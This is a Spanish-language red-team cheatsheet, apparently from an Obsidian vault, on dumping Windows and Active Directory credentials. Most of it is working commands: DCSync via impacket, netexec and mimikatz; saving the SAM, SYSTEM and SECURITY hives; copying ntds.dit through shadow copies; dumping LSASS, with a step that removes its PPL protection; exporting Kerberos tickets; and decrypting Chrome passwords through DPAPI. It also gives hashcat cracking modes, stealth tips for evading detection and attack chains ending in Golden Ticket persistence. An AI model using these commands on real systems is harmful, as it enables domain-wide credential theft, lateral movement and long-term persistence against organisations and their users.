---
aliases:
  - "SAM y SECURITY Hive Dump"
  - "Cached Credentials (mscash)"
  - "Dumping SAM & LSA Secrets"
  - Secrets Dumping
  - Credential Dumping
  - Hash Dumping
  - DCSync
tags:
  - type/technique
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/ntlm
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Credential Harvesting]]"
kind: Technique
linked:
  - "[[Active Directory Explotación]]"
  - "[[DCSync]]"
  - "[[LSASS Dumping]]"
  - "[[Mimikatz Cheatsheet]]"
  - "[[Impacket Toolkit]]"
  - "[[netexec]]"
  - "[[Golden Ticket]]"
  - "[[Pass-the-Hash]]"
---
# Secret Dumping

***

## Cheatsheet
^secret-dumping

| Vector | Requisito | Comando |
| --- | --- | --- |
| **DCSync (remoto)** | DA / `DS-Replication-Get-Changes` | `impacket-secretsdump -just-dc dom.local/da:pass@DC` |
| **DCSync single user** | DA / replication | `impacket-secretsdump -just-dc-user krbtgt dom.local/da:pass@DC` |
| **SAM/SYSTEM local** | Admin local | `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL` |
| **LSASS dump** | SeDebugPrivilege | Ver [[LSASS Dumping]] |
| **NTDS.dit offline** | File access | `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL` |
| **Via NXC** | Admin SMB | `nxc smb DC -u da -p pass --ntds` |
| **Kerberos tickets** | LUID access | `mimikatz sekurlsa::tickets /export` |
| **Cached creds** | Admin local | `impacket-secretsdump -security SECURITY -system SYSTEM LOCAL` |

***

## Concepto

Extraer credenciales (NT hashes, Kerberos keys, cleartext) de un host comprometido o un DC. Categorías:

- **Local**: SAM + SYSTEM + SECURITY hives del host — users locales + cached domain creds + LSA secrets.
- **Domain**: NTDS.dit (DC) — todas las cuentas del dominio. Via DCSync (replication API) o dump offline.
- **In-memory**: LSASS — tickets Kerberos, DPAPI masterkeys, cleartext passwords de sesiones activas.

Output típico es feed para [[Pass-the-Hash]], [[Golden Ticket]], offline cracking, o lateral movement.

## 1. DCSync (preferido — no toca DC físicamente)

Replicación oficial LDAP (MS-DRSR) — abusable por cualquier principal con `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`.

```bash
# Todo el dominio
impacket-secretsdump dom.local/da:password@dc.dom.local

# Solo DC accounts (NTDS completo via replication)
impacket-secretsdump -just-dc dom.local/da:password@dc.dom.local

# Solo usuario específico (stealthier)
impacket-secretsdump -just-dc-user krbtgt dom.local/da:pass@dc.dom.local
impacket-secretsdump -just-dc-user 'TARGET$' dom.local/da:pass@dc.dom.local

# Con ticket en vez de password
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass dom.local/admin@dc.dom.local -just-dc
```

### netexec equivalent

```bash
nxc smb dc.dom.local -u da -p pass --ntds
# Descarga en ~/.nxc/logs/...

# Solo user específico
nxc smb dc -u da -p pass --ntds --user krbtgt
```

### Mimikatz DCSync

```
mimikatz # lsadump::dcsync /domain:dom.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:dom.local /all /csv
```

### Output format

```
dom.local\Administrator:500:aad3b435...:abc123NTHASH:::
dom.local\krbtgt:502:aad3b435...:def456NTHASH:::
```

**AES keys** (para golden post-KB5014746):
```
Administrator:aes256-cts-hmac-sha1-96:abcdef1234...
Administrator:aes128-cts-hmac-sha1-96:1234abcd...
```

## 2. Principals con DCSync rights

```powershell
# PowerView — listar quién tiene replication rights
Get-DomainObjectAcl "DC=dom,DC=local" -ResolveGUIDs |
  ? { ($_.ObjectAceType -match 'Replication-Get-Changes') -and ($_.ActiveDirectoryRights -match 'ExtendedRight') } |
  select SecurityIdentifier, ActiveDirectoryRights
```

Targets típicos: Domain Admins, Enterprise Admins, DCs computer accounts, Exchange "Windows Permissions" grupo (CVE-2019-1040 chain), o cualquier user/grupo al que se le dio rights por error.

Chain ACL + DCSync:
```powershell
# Si tengo GenericAll sobre user X → auto-add DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=dom,DC=local" -PrincipalIdentity X -Rights DCSync
# Ahora X puede DCSync
```

## 3. Local SAM / SECURITY / SYSTEM

Con admin local en un host (incluyendo DC):

```cmd
# Save hives (requires Administrator)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Exfil los tres
```

Dump offline:
```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Content breakdown

| Hive | Contenido |
| --- | --- |
| **SAM** | Local users + NT hashes. |
| **SYSTEM** | Boot key (needed to decrypt SAM/SECURITY). |
| **SECURITY** | LSA secrets (service accounts creds, DPAPI keys, cached domain creds, machine account hash). |

Outputs:
- **Local SAM**: `Administrator:500:...:NTHASH:::`
- **Cached domain creds** (MSCache v2): `dom\user:$DCC2$10240#user#abc...` — crackeable offline con hashcat `-m 2100`.
- **LSA secrets**: service accounts (DefaultPassword, SQL svc), machine account hash (`$machine.ACC`).
- **DPAPI masterkeys**: desbloquea credman, Chrome passwords, Outlook creds.

### In-place (no save)

```bash
# Con admin local + SMB access (remoto)
impacket-secretsdump dom.local/admin:pass@target
# Extrae SAM + LSA + cached sin tocar disk (via RRP registry service)
```

## 4. NTDS.dit offline (DC comprometido)

```powershell
# En DC con admin
ntdsutil
  activate instance ntds
  ifm
  create full c:\temp\ntdsbackup
  quit
  quit

# Genera c:\temp\ntdsbackup\Active Directory\ntds.dit + SYSTEM registry hive
```

Exfil `ntds.dit` + `SYSTEM`, dump offline:
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

Alternativa via VSS:
```powershell
# Shadow copy (evita file lock)
vssadmin create shadow /for=C:
# Usar el shadow path mostrado:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
vssadmin delete shadows /shadow={GUID}
```

### diskshadow (alternativa builtin)

```cmd
diskshadow /s script.txt
# script.txt:
# set context persistent nowriters
# add volume c: alias systemvol
# create
# expose %systemvol% z:
# exec cmd.exe /c copy z:\Windows\NTDS\ntds.dit c:\temp\
# delete shadows volume %systemvol%
# reset
```

## 5. LSASS (in-memory)

Ver [[LSASS Dumping]] en profundidad. Quick ref:

```powershell
# Built-in procdump (Sysinternals)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# PPL-protected LSASS? → need kernel driver (mimikatz !+) or bypass
mimikatz # !+ 
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords

# Parse dump offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Pypykatz (Linux, parseo offline)
pypykatz lsa minidump lsass.dmp
```

## 6. Kerberos tickets en memoria

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
# → .kirbi files (TGT + TGS de sesiones activas)
```

Reuse directo con [[Pass-the-Ticket]]:
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass dom.local/admin@target
```

## 7. DPAPI (Chrome passwords, Credential Manager)

```
# Masterkey decrypt (requires user context or SYSTEM DPAPI backup key)
mimikatz # privilege::debug
mimikatz # sekurlsa::dpapi    # dumpa masterkeys de sesiones activas

# Con backup key (DA lo tiene)
mimikatz # lsadump::backupkeys /system:dc.dom.local /export
# → ntds_capi_*.pfx

# Decrypt Chrome creds
mimikatz # dpapi::chrome /in:"%LocalAppData%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## 8. SAM backup files / shadow volumes

```powershell
# C:\Windows\Repair\ (default backup hives, Vista+ only algunos scenarios)
dir C:\Windows\Repair\SAM
dir C:\Windows\Repair\SYSTEM

# Volume Shadow Copies con SAM antiguo
vssadmin list shadows
# Accede via \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\...
```

## 9. Cracking de hashes dumped

```bash
# NTLM (SAM dump, NTDS)
hashcat -m 1000 hashes.txt rockyou.txt

# NetNTLMv2 (relay capture)
hashcat -m 5600 hashes.txt rockyou.txt

# DCC2 cached domain creds
hashcat -m 2100 hashes.txt rockyou.txt

# Kerberos TGS (kerberoast)
hashcat -m 13100 tgs.txt rockyou.txt

# Kerberos AS-REP (asreproast)
hashcat -m 18200 asrep.txt rockyou.txt
```

## 10. Opsec

- **DCSync event 4662** con `properties: DS-Replication-Get-Changes` — signature clara.
- **secretsdump via admin SMB** = 4624 (logon) + 5140 (share access) + SYSTEM service creation (si usa tasks).
- **LSASS access** = Sysmon event 10 (ProcessAccess a lsass.exe con GrantedAccess suspicious).
- **Volume shadow copy** = event 8222/8194 (VSSADMIN).
- **Mimikatz patterns** = EDRs detectan strings binaries + API hooks.

### Stealth

- `-just-dc-user krbtgt` es más silencioso que `-just-dc` completo (1 replicación vs miles).
- Dumping SAM en host comprometido ya por otra razón — no spawnea nuevos procesos sospechosos.
- Preferir LSASS parse offline sobre mimikatz en host (mimikatz siempre flagged).

## Chains típicas

1. **DCSync → Golden Ticket**: `secretsdump -just-dc-user krbtgt` → `ticketer` → persistence 10 años.
2. **Local SAM → Pass-the-Hash**: `secretsdump LOCAL` → NT hash local admin → lateral movement via SMB sin password.
3. **LSASS → Pass-the-Ticket**: `sekurlsa::tickets /export` → ccache → `impacket-psexec -k` a DC.
4. **NTDS.dit → offline crack**: DC compromise → ntdsutil → crack hashes ofline → reuse en VPN/RDP externo.

## Recursos

- [HackTricks - Credential Access](https://book.hacktricks.xyz/windows-hardening/stealing-credentials)
- [impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [ADSecurity - DCSync](https://adsecurity.org/?p=1729)
- [Mimikatz wiki](https://github.com/gentilkiwi/mimikatz/wiki)

***
